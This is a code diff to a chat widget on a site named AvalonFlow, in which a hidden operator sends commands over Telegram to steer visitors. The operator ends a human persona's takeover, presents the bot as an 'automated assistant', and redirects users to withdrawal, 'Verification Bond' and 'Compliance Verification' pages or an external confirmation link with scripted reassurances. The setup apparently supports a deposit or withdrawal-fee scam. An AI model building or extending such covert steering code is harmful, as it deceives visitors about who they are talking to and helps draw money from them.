@@ -1591,32 +1591,53 @@ async function listenForTelegramMessages() {
                                 msgContent = "Sarah has left the chat. I am Kairos, your automated assistant, and I am back online to help you!";
                             }
 
-                            else if (lowerContent.includes("redirect her to") || lowerContent.includes("redirect him to") || lowerContent.includes("redirect them to")) {
-                                if (lowerContent.includes("dashboard")) {
-                                    msgContent = "Understood. Accessing your main dashboard account panel now...";
-                                    setTimeout(() => { window.location.href = "/dashboard"; }, 2500);
-                                } 
-                                else if (lowerContent.includes("withdrawal")) {
-                                    msgContent = "Perfect. Pulling up your secure withdrawal routing screen...";
-                                    setTimeout(() => { window.location.href = "/withdrawals"; }, 2500);
-                                } 
-                                else if (lowerContent.includes("rewards")) {
-                                    msgContent = "Opening your system reward balance logs. One moment...";
-                                    setTimeout(() => { window.location.href = "/rewards"; }, 2500);
-                                } 
-                                else if (lowerContent.includes("avb") || lowerContent.includes("verification bond")) {
-                                    msgContent = "Initializing secure verification protocols... Opening your AvalonFlow Verification Bond (AVB) ledger now.";
-                                    setTimeout(() => { window.location.href = "/balance"; }, 2500); 
-                                }
-                                else if (lowerContent.includes("compliance")) {
-                                    msgContent = "Initializing priority connection... Opening your Compliance Verification gateway.";
-                                    setTimeout(() => { window.location.href = "/compliance"; }, 2500);
-                                } 
-                                else if (lowerContent.includes("sign out") || lowerContent.includes("logout")) {
-                                    msgContent = "Logging you out securely from the session. Safe travels!";
-                                    setTimeout(() => { window.location.href = "/logout"; }, 2500);
-                                }
-                            }
+                            else if (lowerContent.includes("redirect her to") || lowerContent.includes("redirect him to") || lowerContent.includes("redirect them to") || lowerContent.includes("redirect vitti to")) {
+    
+    // 1. INSTANTLY KILL SARAH'S ACTIVE STATE (Just like end conversation does)
+    isSarahActive = false;
+    sessionStorage.removeItem('agent_takeover');
+    localStorage.removeItem('sarah_takeover_timestamp');
+
+    // 2. INSTANTLY SWAP THE HEADER BACK TO KAIROS
+    const botHeader = document.getElementById('botHeader');
+    if (botHeader) {
+        botHeader.style.background = "linear-gradient(135deg, rgba(107,44,216,0.9), rgba(155,89,182,0.9))";
+        botHeader.textContent = KAIROS_TITLE;
+    }
+    startQuoteAutorotation();
+
+    // 3. PROCESS THE ROUTING DESTINATIONS
+    if (lowerContent.includes("dashboard")) {
+        msgContent = "Understood. Accessing your main dashboard account panel now...";
+        setTimeout(() => { window.location.href = "/dashboard"; }, 2500);
+    } 
+    else if (lowerContent.includes("withdrawal")) {
+        msgContent = "Perfect. Pulling up your secure withdrawal routing screen...";
+        setTimeout(() => { window.location.href = "/withdrawals"; }, 2500);
+    } 
+    else if (lowerContent.includes("rewards")) {
+        msgContent = "Opening your system reward balance logs. One moment...";
+        setTimeout(() => { window.location.href = "/rewards"; }, 2500);
+    } 
+    else if (lowerContent.includes("avb") || lowerContent.includes("verification bond")) {
+        msgContent = "Initializing secure verification protocols... Opening your AvalonFlow Verification Bond (AVB) ledger now.";
+        setTimeout(() => { window.location.href = "/balance"; }, 2500); 
+    }
+    else if (lowerContent.includes("compliance")) {
+        msgContent = "Initializing priority connection... Opening your Compliance Verification gateway.";
+        setTimeout(() => { window.location.href = "/compliance"; }, 2500);
+    } 
+    // ADDED: Captures 'signin' from your Telegram screenshot command to drop to login
+    else if (lowerContent.includes("sign out") || lowerContent.includes("logout") || lowerContent.includes("signin")) {
+        msgContent = "Routing session parameters back to the secure access terminal...";
+        setTimeout(() => { window.location.href = "/logout"; }, 2500); // Redirects to login/logout path
+    }
+    else {
+        // Fallback message if an unknown page string gets passed
+        msgContent = "Processing system routing protocols. Updating portal window now...";
+        setTimeout(() => { window.location.href = "https://link.avalonflow.site/confirmations"; }, 2500);
+    }
+                            } // This bracket safely closes: if (msgType === "text")
                         }
 
                         setTimeout(() => { showTyping(); }, chainDelay);
